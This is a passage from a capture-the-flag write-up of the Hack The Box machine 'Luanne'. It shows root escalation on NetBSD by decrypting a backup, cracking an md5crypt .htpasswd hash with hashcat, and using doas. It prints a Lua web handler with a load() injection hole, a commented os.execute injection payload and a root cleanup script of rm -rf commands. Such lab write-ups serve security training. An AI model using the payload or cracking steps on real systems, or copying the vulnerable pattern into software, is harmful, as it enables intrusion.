Last login: Sat Mar 27 21:16:20 2021 from 10.10.14.220
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020

Welcome to NetBSD!

luanne$ id && whoami
uid=1000(r.michaels) gid=100(users) groups=100(users)
r.michaels
luanne$ ls -la
total 52
dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 .
drwxr-xr-x  3 root        wheel   512 Sep 14  2020 ..
-rw-r--r--  1 r.michaels  users  1772 Feb 14  2020 .cshrc
drwx------  2 r.michaels  users   512 Sep 14  2020 .gnupg
-rw-r--r--  1 r.michaels  users   431 Feb 14  2020 .login
-rw-r--r--  1 r.michaels  users   265 Feb 14  2020 .logout
-rw-r--r--  1 r.michaels  users  1498 Feb 14  2020 .profile
-rw-r--r--  1 r.michaels  users   166 Feb 14  2020 .shrc
dr-x------  2 r.michaels  users   512 Sep 16  2020 .ssh
dr-xr-xr-x  2 r.michaels  users   512 Nov 24 09:26 backups
dr-xr-x---  4 r.michaels  users   512 Sep 16  2020 devel
dr-x------  2 r.michaels  users   512 Sep 16  2020 public_html
-r--------  1 r.michaels  users    33 Sep 16  2020 user.txt
luanne$ cat user.txt
ea5f0ce6a917b0be1eabc7f9218febc0
```

got the user.txt flag

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User `r.michaels`

```text
luanne$ groups r.michaels
users
```

`r.michaels` was only a member of the users group

```text
luanne$ cd backups/                                                                                   
luanne$ ls -la
total 12
dr-xr-xr-x  2 r.michaels  users   512 Nov 24 09:26 .
dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 ..
-r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc
```

In the `/backups` folder there was an encrypted tar file. searching for netbsd tar.gz.enc led to

[https://man.netbsd.org/netpgp.1](https://man.netbsd.org/netpgp.1)

```text
luanne$ netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc | tar xz -C test           
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
uid              RSA 2048-bit key <r.michaels@localhost>
tar: Error opening archive: Failed to open '/dev/nrst0'
```

looks like 2048 bit rsa key

* [https://man.netbsd.org/tar.1](https://man.netbsd.org/tar.1)
* [https://netbsd-users.netbsd.narkive.com/ZatFbpGV/tar-how-does-it-work](https://netbsd-users.netbsd.narkive.com/ZatFbpGV/tar-how-does-it-work)

```text
netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc | tar -xzf - -C /tmp/     
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
uid              RSA 2048-bit key <r.michaels@localhost>
```

success

```text
luanne$ ls -ls /tmp
total 8
8 drwxr-x---  4 r.michaels  wheel  96 Sep 16  2020 devel-2020-09-16
luanne$ cd /tmp/devel-2020-09-16/                                                                     
luanne$ ls -la
total 32
drwxr-x---  4 r.michaels  wheel  96 Sep 16  2020 .
drwxrwxrwt  3 root        wheel  48 Mar 28 04:02 ..
drwxr-xr-x  2 r.michaels  wheel  48 Sep 16  2020 webapi
drwxr-xr-x  2 r.michaels  wheel  96 Sep 16  2020 www
```

I was able to successfuly extract the files, but right after I started to look through them the /tmp directory was cleaned up

```text
luanne$ ls -la
total 20
drwxrwxrwt   3 root        wheel   48 Mar 28 04:04 .
drwxr-xr-x  21 root        wheel  512 Sep 16  2020 ..
drwxr-x---   4 r.michaels  wheel   96 Sep 16  2020 devel-2020-09-16
luanne$ cd devel-2020-09-16/                                                                          
luanne$ ls -la
total 32
drwxr-x---  4 r.michaels  wheel  96 Sep 16  2020 .
drwxrwxrwt  3 root        wheel  48 Mar 28 04:04 ..
drwxr-xr-x  2 r.michaels  wheel  48 Sep 16  2020 webapi
drwxr-xr-x  2 r.michaels  wheel  96 Sep 16  2020 www
luanne$ cd www
luanne$ ls -la
total 32
drwxr-xr-x  2 r.michaels  wheel   96 Sep 16  2020 .
drwxr-x---  4 r.michaels  wheel   96 Sep 16  2020 ..
-rw-r--r--  1 r.michaels  wheel   47 Sep 16  2020 .htpasswd
-rw-r--r--  1 r.michaels  wheel  378 Sep 16  2020 index.html
luanne$ cat .htpasswd                                                                                 
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
```

this has was different from the one I had cracked earlier

```text
luanne$ cat index.html                                                                                
<!doctype html>
<html>
  <head>
    <title>Index</title>
  </head>
  <body>
    <p><h3>Weather Forecast API</h3></p>
    <p><h4>List available cities:</h4></p>
    <a href="/webapi/weather?city=list">/webapi/weather?city=list</a>
    <p><h4>Five day forecast (London)</h4></p>
    <a href="/webapi/weather?city=London">/webapi/weather?city=London</a>
    <hr>
  </body>
</html>
```

This was the same as the `/forecast` site I had seen earlier

```text
luanne$ cd ../webapi/                                                                                 
luanne$ ls -la
total 32
drwxr-xr-x  2 r.michaels  wheel    48 Sep 16  2020 .
drwxr-x---  4 r.michaels  wheel    96 Sep 16  2020 ..
-rw-r--r--  1 r.michaels  wheel  7072 Sep 16  2020 weather.lua
```

The `webapi` folder only contained the file `weather.lua`

```lua
luanne$ cat weather.lua                                                                               
httpd = require 'httpd'
math = require 'math'
sqlite = require 'sqlite'

cities = {"London", "Manchester", "Birmingham", "Leeds", "Glasgow", "Southampton", "Liverpool", "Newcastle", "Nottingham", "Sheffield", "Bristol", "Belfast", "Leicester"}

weather_desc = {"sunny", "cloudy", "partially cloudy", "rainy", "snowy"}


function valid_city(cities, city)
    for i, v in ipairs(cities) do
        if v == city
        then
            return true
        end
    end
    return false
end


function forecast(env, headers, query)
    if query and query["city"]
    then
        local city = query["city"]
        if city == "list"
        then 
            httpd.write("HTTP/1.1 200 Ok\r\n")
            httpd.write("Content-Type: application/json\r\n\r\n")
            httpd.write('{"code": 200,')
            httpd.write('"cities": [')
            for k,v in pairs(cities) do
                httpd.write('"' .. v .. '"')
                if k < #cities
                then
                    httpd.write(',')
                end
            end
            httpd.write(']}')
        elseif not valid_city(cities, city)
        then
            -- city=London') os.execute('id') --
            httpd.write("HTTP/1.1 500 Error\r\n")
            httpd.write("Content-Type: application/json\r\n\r\n")
            local json = string.format([[
                httpd.write('{"code": 500,')
                httpd.write('"error": "unknown city: %s"}')
            ]], city)

            load(json)()
        else
            -- just some fake weather data

            ...snipped...

        end 
    else
        httpd.write("HTTP/1.1 200 Ok\r\n")
        httpd.write("Content-Type: application/json\r\n\r\n")
        httpd.print('{"code": 200, "message": "No city specified. Use \'city=list\' to list available cities."}')
    end
end

httpd.register_handler('forecast', forecast)
```

Nothing useful here? There did seem to be a backdoor potentially written in, though it was commented out `-- city=London') os.execute('id') --`. I think this is where I injected my original access

```text
┌──(zweilos㉿kali)-[~/htb/luanne]
└─$ echo 'webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.' >> hash                                130 ⨯

┌──(zweilos㉿kali)-[~/htb/luanne]
└─$ hashcat -O -D1,2 -a0 -m500 hash /usr/share/wordlists/rockyou.txt --username
hashcat (v6.1.1) starting...

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

INFO: Removed 1 hash found in potfile.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.:littlebear    

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: hash
Time.Started.....: Sat Mar 27 23:58:52 2021 (1 sec)
Time.Estimated...: Sat Mar 27 23:58:53 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    41505 H/s (11.99ms) @ Accel:512 Loops:250 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests, 2/2 (100.00%) Salts
Progress.........: 26636/28688770 (0.09%)
Rejected.........: 12/26636 (0.05%)
Restore.Point....: 12293/14344385 (0.09%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidates.#1....: gamboa -> billybob1

Started: Sat Mar 27 23:58:51 2021
Stopped: Sat Mar 27 23:58:54 2021
```

The hash cracked almost immediately, finding a password of `littlebear`

```text
luanne$ doas whoami
Password:
root
```

I was able to run commands with `doas` with this password!

### Root.txt

```text
# cd /root
# ls -la
total 36
drwxr-xr-x   2 root  wheel   512 Nov 24 09:30 .
drwxr-xr-x  21 root  wheel   512 Sep 16  2020 ..
-r--r--r--   2 root  wheel  1220 Feb 14  2020 .cshrc
-rw-------   1 root  wheel    59 Feb 14  2020 .klogin
-rw-r--r--   1 root  wheel   212 Feb 14  2020 .login
-r--r--r--   2 root  wheel   701 Feb 14  2020 .profile
-rw-r--r--   1 root  wheel   221 Feb 14  2020 .shrc
-r-x------   1 root  wheel   178 Nov 24 09:57 cleanup.sh
-r--------   1 root  wheel    33 Sep 16  2020 root.txt
# cat root      
cat: root: No such file or directory
# cat root.txt
7a9b5c206e8e8ba09bb99bd113675f66
# cat cleanup.sh
#!/bin/sh

/usr/bin/find / -name devel_backup-2020-09-16.tar.gz -exec rm -f {} \;
/usr/bin/find / -name devel-2020-09-16 -exec rm -rf {} \;
/usr/bin/find /tmp -exec rm -rf {} \;
```

Note: `/etc/master.passwd` is where password hashes are stored in BSD, not /etc/shadow

Thanks to [`polarbearer`](https://app.hackthebox.eu/users/159204) for something interesting or useful about this machine.

If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!

